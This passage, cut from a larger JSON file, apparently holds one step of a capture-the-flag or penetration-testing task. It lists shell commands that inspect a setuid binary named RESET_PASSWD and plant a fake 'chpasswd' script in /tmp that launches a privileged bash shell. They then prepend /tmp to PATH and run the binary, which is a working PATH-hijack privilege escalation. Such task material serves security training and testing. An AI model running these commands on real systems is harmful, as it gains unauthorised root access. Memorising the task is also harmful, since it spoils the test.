            "strings /home/john/RESET_PASSWD",
            "echo '#!/bin/bash' > /tmp/chpasswd",
            "echo '/bin/bash -p' >> /tmp/chpasswd",
            "chmod +x /tmp/chpasswd",
            "export PATH=/tmp:$PATH",
            "./RESET_PASSWD"
          ]
        }
      ],
